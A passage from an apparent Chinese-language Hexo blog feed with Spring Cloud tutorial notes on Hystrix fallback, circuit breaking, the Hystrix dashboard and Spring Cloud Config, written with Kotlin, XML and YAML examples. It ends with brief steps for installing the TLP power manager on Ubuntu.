<h2 id="Hystrix"><a href="#Hystrix" class="headerlink" title="Hystrix"></a>Hystrix</h2><p>Hystrix是一个用于处理分布式系统的延迟和容错的开源库，在分布式系统里，许多依赖不可避免的会调用失败，比如超时、异常等，<br>Hystrix能够保证在一个依赖出问题的情况下，不会导致整体服务失败，避免级联故障，以提高分布式系统的弹性。<br>“断路器”本身是一种开关装置，当某个服务单元发生故障之后，通过断路器的故障监控（类以熔断保险丝），向调用方返回一个符合<br>预期的、可处理的备选响应(FallBack)，而不是长时间的等待或者抛出调用方无法处理的异常，这样就保证了服务调用方的线程不会<br>被长时间、不必要地占用，从而避免了故障在分布式系统中的蔓延，乃至雪崩。</p>
<h3 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h3><p>hystrix既可以使用在消费侧，也可以使用在服务侧<br>首先要导包：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.cloud<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-cloud-starter-netflix-hystrix<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="服务降级-fallback"><a href="#服务降级-fallback" class="headerlink" title="服务降级(fallback)"></a>服务降级(fallback)</h4><p>立即返回一个表示服务出错的响应<br><img src="https://image.zfxt.top/hexo-blog/SpringCloud(5)-2023-09-15-40-30.png"><br>-. 给服务端(生产者)进行配置</p>
<ol>
<li>主启动类激活：<figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="meta">@EnableCircuitBreaker</span></span><br><span class="line"><span class="keyword">open</span> <span class="keyword">class</span> <span class="title class_">PaymentHystrixMain8001</span></span><br></pre></td></tr></table></figure></li>
<li>给服务类添加注解和配置：<figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="meta">@HystrixCommand(</span></span><br><span class="line"><span class="meta">        commandProperties = [</span></span><br><span class="line"><span class="meta">            HystrixProperty(name=<span class="string">&quot;execution.timeout.enabled&quot;</span>, value=<span class="string">&quot;true&quot;</span>),</span></span><br><span class="line"><span class="meta">            HystrixProperty(name=<span class="string">&quot;execution.isolation.thread.timeoutInMilliseconds&quot;</span>, value=<span class="string">&quot;3000&quot;</span>),</span></span><br><span class="line"><span class="meta">        ],</span></span><br><span class="line"><span class="meta">        fallbackMethod = <span class="string">&quot;error_handle&quot;</span>)</span></span><br><span class="line">    <span class="keyword">open</span> <span class="function"><span class="keyword">fun</span> <span class="title">paymentInfo_TimeOut</span><span class="params">(id:<span class="type">Int</span>)</span></span>:String&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Thread.sleep(<span class="number">3000</span>)</span><br><span class="line">        &#125;<span class="keyword">catch</span> (e:InterruptedException)&#123;</span><br><span class="line">            e.printStackTrace()</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;线程池：<span class="subst">$&#123;Thread.currentThread().name&#125;</span> paymentInfo_TimeOut,id:<span class="subst">$&#123;id&#125;</span>\t. 耗时3秒钟&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">     <span class="keyword">open</span> <span class="function"><span class="keyword">fun</span> <span class="title">error_handle</span><span class="params">(id:<span class="type">Int</span>)</span></span>:String&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;出错了呢&quot;</span></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></li>
</ol>
<p>-. 给客户端(消费者)进行配置<br>首先配置yml：</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">feign:</span></span><br><span class="line">  <span class="attr">hystrix:</span></span><br><span class="line">    <span class="attr">enabled:</span> <span class="literal">true</span></span><br></pre></td></tr></table></figure>
<p>主启动类开启注解：</p>
<figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="meta">@EnableHystrix</span></span><br></pre></td></tr></table></figure>
<p>然后为他的controller类添加上注解和错误解决方法：</p>
<figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="meta">@HystrixCommand(</span></span><br><span class="line"><span class="meta">        commandProperties = [</span></span><br><span class="line"><span class="meta">            HystrixProperty(name=<span class="string">&quot;execution.timeout.enabled&quot;</span>, value=<span class="string">&quot;true&quot;</span>),</span></span><br><span class="line"><span class="meta">            HystrixProperty(name=<span class="string">&quot;execution.isolation.thread.timeoutInMilliseconds&quot;</span>, value=<span class="string">&quot;3000&quot;</span>),</span></span><br><span class="line"><span class="meta">        ],</span></span><br><span class="line"><span class="meta">        fallbackMethod = <span class="string">&quot;error_handle&quot;</span>)</span></span><br><span class="line">    <span class="keyword">open</span> <span class="function"><span class="keyword">fun</span> <span class="title">paymentInfo_TimeOut</span><span class="params">(id:<span class="type">Int</span>)</span></span>:String&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Thread.sleep(<span class="number">3000</span>)</span><br><span class="line">        &#125;<span class="keyword">catch</span> (e:InterruptedException)&#123;</span><br><span class="line">            e.printStackTrace()</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;线程池：<span class="subst">$&#123;Thread.currentThread().name&#125;</span> paymentInfo_TimeOut,id:<span class="subst">$&#123;id&#125;</span>\t. 耗时3秒钟&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">open</span> <span class="function"><span class="keyword">fun</span> <span class="title">error_handle</span><span class="params">(id:<span class="type">Int</span>)</span></span>:String&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;出错了呢&quot;</span></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h5 id="解决代码膨胀问题"><a href="#解决代码膨胀问题" class="headerlink" title="解决代码膨胀问题"></a>解决代码膨胀问题</h5><p>如果每个方法都需要一个<code>fallback</code>解决方法。那么就会导致代码过于繁多。不利于查看。</p>
<ol>
<li>全局配置一个fallback方法。在需要处理的业务类上加上注解<figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="meta">@DefaultProperties(defaultFallback = <span class="string">&quot;global_error_handle&quot;</span>)</span></span><br><span class="line"><span class="keyword">open</span> <span class="keyword">class</span> <span class="title class_">PaymentController</span> </span><br></pre></td></tr></table></figure>
如果具体的方法中没有标明fallback方法，那么就会找全局的fallback方法。否则就选择就近的fallback方法。<br>但是这样子也会面临一些代码耦合度高的问题，需要去解耦。<br><strong>常见的三个服务器问题：运行，超时，宕机</strong><br>新的解决方法。不在业务层中进行修改。而是在service层中修改。这样子可以更好的解耦合。<br><img src="https://image.zfxt.top/hexo-blog/SpringCloud(5)-2023-09-06-36-29.png"></li>
<li>定义一个类实现这个service接口：<figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">PaymentFallbackService</span>: <span class="type">PaymentService</span> &#123;</span><br><span class="line">    <span class="keyword">override</span> <span class="function"><span class="keyword">fun</span> <span class="title">paymentInfo_OK</span><span class="params">(id: <span class="type">Int</span>)</span></span>: String &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;paymentInfo_OK-------paymentFallbackService fallback-------&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">override</span> <span class="function"><span class="keyword">fun</span> <span class="title">paymentInfo_TimeOut</span><span class="params">(id: <span class="type">Int</span>)</span></span>: String &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;paymentInfo_TimeOut-------paymentFallbackService fallback-------&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
<li>然后配置yaml选项，开启配置：<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">feign:</span></span><br><span class="line">  <span class="attr">hystrix:</span></span><br><span class="line">    <span class="attr">enabled:</span> <span class="literal">true</span></span><br></pre></td></tr></table></figure></li>
<li>设置统一的fallback。<figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="meta">@FeignClient(<span class="string">&quot;CLOUD-PROVIDER-SERVICE&quot;</span>, fallback = PaymentFallbackService::class)</span></span><br></pre></td></tr></table></figure>
然后测试</li>
</ol>
<h4 id="服务熔断-break"><a href="#服务熔断-break" class="headerlink" title="服务熔断(break)"></a>服务熔断(break)</h4><p>即保险丝的意思<br><strong>熔断机制概述</strong><br>熔断机制是应对雪崩效亚的一种微服务链路保护机制。当扇出链路的某个微服务出错不可用或者响应时间太长时，<br>会进行服务的降级，进而熔断该节点微服务的调用，快速返回错误的响应信息。<br>当检测到该节点微服务调用响应正常后，恢复调用链路。<br>在Spring Cloud框架里，熔断机制通过Hystrix3实现。Hystrix会监控微服务间调用的状况，<br>当失败的调用到一定阈值，缺省是5秒内20次调用失败，就会启动熔断机制。熔断机制的注解是@HystrixCommand。<br><img src="https://image.zfxt.top/hexo-blog/SpringCloud(5)-2023-09-03-12-02.png"><br>配置8001支付模块Service中的熔断器：</p>
<figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="comment">//=====服务熔断</span></span><br><span class="line">    <span class="meta">@HystrixCommand(</span></span><br><span class="line"><span class="meta">        fallbackMethod = <span class="string">&quot;paymentCircuitBreaker_fallback&quot;</span>,</span></span><br><span class="line"><span class="meta">        commandProperties = [</span></span><br><span class="line"><span class="meta">            HystrixProperty(name = <span class="string">&quot;circuitBreaker.enabled&quot;</span>, value = <span class="string">&quot;true&quot;</span>),//是否开启断路器</span></span><br><span class="line"><span class="meta">            HystrixProperty(name = <span class="string">&quot;circuitBreaker.requestVolumeThreshold&quot;</span>, value = <span class="string">&quot;10&quot;</span>),//请求次数</span></span><br><span class="line"><span class="meta">            HystrixProperty(name = <span class="string">&quot;circuitBreaker.sleepWindowInMilliseconds&quot;</span>, value = <span class="string">&quot;10000&quot;</span>),//时间窗口期</span></span><br><span class="line"><span class="meta">            HystrixProperty(name = <span class="string">&quot;circuitBreaker.errorThresholdPercentage&quot;</span>, value = <span class="string">&quot;60&quot;</span>),//失败率达到多少后跳闸</span></span><br><span class="line"><span class="meta">        ]</span></span><br><span class="line"><span class="meta">    )</span></span><br><span class="line">    <span class="keyword">open</span> <span class="function"><span class="keyword">fun</span> <span class="title">paymentCircuitBreaker</span><span class="params">(<span class="meta">@PathVariable(<span class="string">&quot;id&quot;</span>)</span> id: <span class="type">Int</span>)</span></span>: String &#123;</span><br><span class="line">        <span class="keyword">if</span> (id &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> RuntimeException(<span class="string">&quot;*****id不能为负数&quot;</span>)</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">val</span> serialNumber = IdUtil.simpleUUID()</span><br><span class="line">        <span class="keyword">return</span> Thread.currentThread().name + <span class="string">&quot;调用成功,流水号：<span class="variable">$serialNumber</span>&quot;</span></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">open</span> <span class="function"><span class="keyword">fun</span> <span class="title">paymentCircuitBreaker_fallback</span><span class="params">(<span class="meta">@PathVariable(<span class="string">&quot;id&quot;</span>)</span> id: <span class="type">Int</span>)</span></span>: String &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;id不能为负数，请稍后重试:<span class="variable">$id</span>&quot;</span></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>以下是controller的代码：</p>
<figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="comment">//===服务熔断</span></span><br><span class="line">    <span class="meta">@GetMapping(</span></span><br><span class="line"><span class="meta">        <span class="string">&quot;/payment/circuit/&#123;id&#125;&quot;</span></span></span><br><span class="line"><span class="meta">    )</span></span><br><span class="line">    <span class="function"><span class="keyword">fun</span> <span class="title">paymentcircuitBreaker</span><span class="params">(<span class="meta">@PathVariable(<span class="string">&quot;id&quot;</span>)</span> id:<span class="type">Int</span>)</span></span>: String &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">var</span> result = paymentService.paymentCircuitBreaker(id);</span><br><span class="line">        log.info(<span class="string">&quot;****result:&quot;</span> + result);</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>通过访问这个端口，然后实现服务熔断</p>
<h4 id="服务限流-flowlimit"><a href="#服务限流-flowlimit" class="headerlink" title="服务限流(flowlimit)"></a>服务限流(flowlimit)</h4><p><img src="https://image.zfxt.top/hexo-blog/SpringCloud(5)-2023-09-05-00-19.png"></p>
<h3 id="hystrix仪表盘使用"><a href="#hystrix仪表盘使用" class="headerlink" title="hystrix仪表盘使用"></a>hystrix仪表盘使用</h3><ol>
<li><p>建module</p>
</li>
<li><p>修改pom</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.cloud<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-cloud-starter-netflix-hystrix-dashboard<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">	//提供监控信息</span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-actuator<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>关键是这个dashboard的包导入</p>
</li>
<li><p>设置yml。只设置端口即可。</p>
</li>
<li><p>主启动类<br><strong>以下是8001提供服务端，只有这样配置才能被找到</strong></p>
<figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line">需要配置一些固定的内容(以下是<span class="number">8001</span>的提供服务端，配置后才能被dashboard找到)</span><br><span class="line"><span class="meta">@SpringBootApplication(exclude = [JacksonAutoConfiguration::class])</span></span><br><span class="line"><span class="meta">@EnableEurekaClient</span></span><br><span class="line"><span class="meta">@EnableCircuitBreaker</span></span><br><span class="line"><span class="keyword">open</span> <span class="keyword">class</span> <span class="title class_">PaymentHystrixMain8001</span> &#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     *此配置是为了服务监控而配置，与服务容错本身无关，springcloud升级后的坑</span></span><br><span class="line"><span class="comment">     *ServletRegistrationBean因为springboot的默认路径不是&quot;/hystrix.stream&quot;,</span></span><br><span class="line"><span class="comment">     *只要在自己的项目里配置上下面的serv儿et就可以了</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="keyword">open</span> <span class="function"><span class="keyword">fun</span> <span class="title">getServlet</span><span class="params">()</span></span>: ServletRegistrationBean&lt;HystrixMetricsStreamServlet&gt; &#123;</span><br><span class="line">        <span class="keyword">var</span> streamServlet: HystrixMetricsStreamServlet = HystrixMetricsStreamServlet();</span><br><span class="line">        <span class="keyword">var</span> registrationBean = ServletRegistrationBean(streamServlet);</span><br><span class="line">        registrationBean.setLoadOnStartup(<span class="number">1</span>);</span><br><span class="line">        registrationBean.addUrlMappings(<span class="string">&quot;/hystrix.stream&quot;</span>);</span><br><span class="line">        registrationBean.setName(<span class="string">&quot;HystrixMetricsstreamServlet&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> registrationBean;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">    <span class="function"><span class="keyword">fun</span> <span class="title">main</span><span class="params">(args: <span class="type">Array</span>&lt;<span class="type">String</span>&gt;)</span></span> &#123;</span><br><span class="line">        runApplication&lt;PaymentHystrixMain8001&gt;(*args)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></li>
</ol>
]]></content>
      <categories>
        <category>springcloud</category>
      </categories>
      <tags>
        <tag>SpringCloud</tag>
      </tags>
  </entry>
  <entry>
    <title>SpringCloud(7)</title>
    <url>/posts/57dafa86/</url>
    <content><![CDATA[<h1 id="Config"><a href="#Config" class="headerlink" title="Config"></a>Config</h1><p>微服务意味着要将单体应用中的业务拆分成一个个子服务，每个服务的粒度相对较小，因此系统中会出现大量的服务。由于每个服务都需要必要的配置信息才能运行，所以一套集中式的动态的配置管理设施是必不可少的。</p>
<p>spring configServer就可以解决这个问题<br><img src="https://image.zfxt.top/hexo-blog/SpringCloud(7)-2023-11-00-38-26.png"><br>将相同的配置抽调出来放于ConfigServer中去解决。</p>
<h2 id="服务端"><a href="#服务端" class="headerlink" title="服务端"></a>服务端</h2><p>使用configServer通常与git，github相结合，通过在git上修改配置文件，从而让每个客户端自己读取到新的配置文件而不用重启。</p>
<ol>
<li>现在GitHub上建立一个新仓库，这个仓库作为以后会使用到的配置文件中心</li>
<li>然后是构建服务端（module，pom，yml，主启动类，业务）<br>以下是一些相关的包<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.cloud<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-cloud-config-server<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-web<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-actuator<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure>
配置yml<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">server:</span></span><br><span class="line">  <span class="attr">port:</span> <span class="number">3344</span></span><br><span class="line"></span><br><span class="line"><span class="attr">spring:</span></span><br><span class="line">  <span class="attr">application:</span></span><br><span class="line">    <span class="attr">name:</span> <span class="string">cloud-config-center</span> <span class="comment"># 注册进Eureka服务器的微服务名</span></span><br><span class="line">  <span class="attr">cloud:</span></span><br><span class="line">    <span class="attr">config:</span></span><br><span class="line">      <span class="attr">server:</span></span><br><span class="line">        <span class="attr">git:</span></span><br><span class="line">          <span class="attr">uri:</span> <span class="string">https://github.com/zfx-t/springcloud-config.git</span></span><br><span class="line">          <span class="attr">search-paths:</span></span><br><span class="line">            <span class="bullet">-</span> <span class="string">springcloud-config</span></span><br><span class="line">        <span class="comment">#### 搜索目录</span></span><br><span class="line">      <span class="attr">label:</span> <span class="string">main</span></span><br><span class="line"></span><br><span class="line"><span class="attr">eureka:</span></span><br><span class="line">  <span class="attr">client:</span></span><br><span class="line">    <span class="attr">service-url:</span></span><br><span class="line">      <span class="attr">defaultZone:</span> <span class="string">http://localhost:7001/eureka</span></span><br></pre></td></tr></table></figure>
设置主启动类<figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="meta">@SpringBootApplication</span></span><br><span class="line"><span class="meta">@EnableConfigServer</span></span><br><span class="line"><span class="keyword">open</span> <span class="keyword">class</span> <span class="title class_">Center3344</span> &#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">fun</span> <span class="title">main</span><span class="params">(args:<span class="type">Array</span>&lt;<span class="type">String</span>&gt;)</span></span>&#123;</span><br><span class="line">    runApplication&lt;Center3344&gt;(*args)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ol>
<h3 id="配置读取规则"><a href="#配置读取规则" class="headerlink" title="配置读取规则"></a>配置读取规则</h3><p><img src="https://image.zfxt.top/hexo-blog/SpringCloud(7)-2023-11-05-35-40.png"><br>可以通过<code>http://config-3344.com:3344/master/config-dev.yml</code>来读取到信息<br><strong>服务端也被称为分布式配置中心，他是一个独立的微服务应用</strong></p>
<h2 id="客户端"><a href="#客户端" class="headerlink" title="客户端"></a>客户端</h2><p><strong>5大操作</strong><br>pom修改：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-web<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-actuator<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.cloud<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-cloud-starter-config<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.cloud<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-cloud-starter-netflix-eureka-client<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p><strong>这里不再写<code>application.yml</code>而是使用<code>bootstrap.yml</code></strong><br>applicaiton.yml是用户级的资源配置项<br>bootstrap.yml是系统级的，优先级更加高</p>
<blockquote>
<p>Spring Cloud会创建一个“Bootstrap Context”,作为Spring应用的Application Context的父上下文。初始化的时候，<code>Bootstrap Context</code>负责从外部源加载配置属性并解析配置。这两个上下文共享一个从外部获取的<code>Environment</code>。<br><code>Bootstrap</code>属性有高优先级，默认情况下，它们不会被本地配置覆盖。<code>Bootstrap context</code>和<code>Application Context</code>有着不同的约定<br>所以新增了一个bootstrap.yml文件，保证<code>Bootstrap Context</code>和<code>Application Context</code>配置的分离。</p>
</blockquote>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">server:</span></span><br><span class="line">  <span class="attr">port:</span> <span class="number">3355</span></span><br><span class="line"><span class="attr">spring:</span></span><br><span class="line">  <span class="attr">application:</span></span><br><span class="line">    <span class="attr">name:</span> <span class="string">config-client</span></span><br><span class="line">  <span class="attr">cloud:</span></span><br><span class="line">    <span class="comment">#Config客户端配置</span></span><br><span class="line">    <span class="attr">config:</span></span><br><span class="line">      <span class="attr">label:</span> <span class="string">master</span>  <span class="comment">#分支名称</span></span><br><span class="line">      <span class="attr">name:</span> <span class="string">config</span>  <span class="comment">#配置文件名称</span></span><br><span class="line">      <span class="attr">profile:</span> <span class="string">dev</span> <span class="comment">#读取后缀名称上述3个综合：master分支上config-dev.ymL的配置文件被读http://config-3344.com:3344/master/config-dev.yml</span></span><br><span class="line">      <span class="attr">uri:</span> <span class="string">http://localhost:3344</span>  <span class="comment">#配置中心地k</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#服务注册到eureka地址</span></span><br><span class="line"><span class="attr">eureka:</span></span><br><span class="line">  <span class="attr">client:</span></span><br><span class="line">    <span class="attr">service-url:</span></span><br><span class="line">      <span class="attr">defaultZone:</span> <span class="string">http://localhost:7001/eureka</span></span><br></pre></td></tr></table></figure>

<p>主启动类：</p>
<figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="meta">@SpringBootApplication</span></span><br><span class="line"><span class="meta">@EnableEurekaClient</span></span><br><span class="line"><span class="keyword">open</span> <span class="keyword">class</span> <span class="title class_">Client3355</span> &#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">fun</span> <span class="title">main</span><span class="params">(args: <span class="type">Array</span>&lt;<span class="type">String</span>&gt;)</span></span> &#123;</span><br><span class="line">    runApplication&lt;Client3355&gt;(*args)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>业务类：</p>
<figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ConfigClientController</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Value(<span class="string">&quot;\$&#123;config.info&#125;&quot;</span>)</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">lateinit</span> <span class="keyword">var</span> configInfo:String</span><br><span class="line"></span><br><span class="line">    <span class="meta">@GetMapping(<span class="string">&quot;/configInfo&quot;</span>)</span></span><br><span class="line">    <span class="function"><span class="keyword">fun</span> <span class="title">getConfigInfo</span><span class="params">()</span></span>: String &#123;</span><br><span class="line">        <span class="keyword">return</span> configInfo</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="动态刷新问题"><a href="#动态刷新问题" class="headerlink" title="动态刷新问题"></a>动态刷新问题</h3><p>实时更新gitee上的内容后，需要服务器自动去更新内容，并完成所有客户端的自动更新。</p>
<ol>
<li>修改客户端模块<br>-. pom引入actuator监控<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-actuator<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
-. 修改yml，暴露监控端点<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 暴露监控端点</span></span><br><span class="line"><span class="attr">management:</span></span><br><span class="line">  <span class="attr">endpoints:</span></span><br><span class="line">    <span class="attr">web:</span></span><br><span class="line">      <span class="attr">exposure:</span></span><br><span class="line">        <span class="attr">include:</span> <span class="string">&quot;*&quot;</span></span><br></pre></td></tr></table></figure>
-. 业务类添加<code>@RefreshScope</code>注解<br>-. 然后要依赖于运维业务人员人为的给客户端发送一个刷新的post请求<br>必须是POST请求<br>curl -X POST “<a href="http://localhost:3355/actuator/refresh">http://localhost:3355/actuator/refresh</a>“</li>
</ol>
]]></content>
      <categories>
        <category>springcloud</category>
      </categories>
  </entry>
  <entry>
    <title>TLP的安装</title>
    <url>/posts/1b666b6c/</url>
    <content><![CDATA[<h2 id="TLP"><a href="#TLP" class="headerlink" title="TLP"></a>TLP</h2><p>TLP 是一款自由开源的高级电源管理工具，可在不进行任何配置更改的情况下延长电池寿命。<br>所有 TLP 设置都存储在 &#x2F;etc&#x2F;default&#x2F;tlp 中。其默认配置提供了开箱即用的优化的节能设置。<br>TLP 功能:不做描述，只说明安装过程<br>在ubuntu上，</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt install tlp tlp-rdw</span><br></pre></td></tr></table></figure>
<p>成功安装后使用以下命令启动服务。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">systemctl start tlp.service</span><br></pre></td></tr></table></figure>
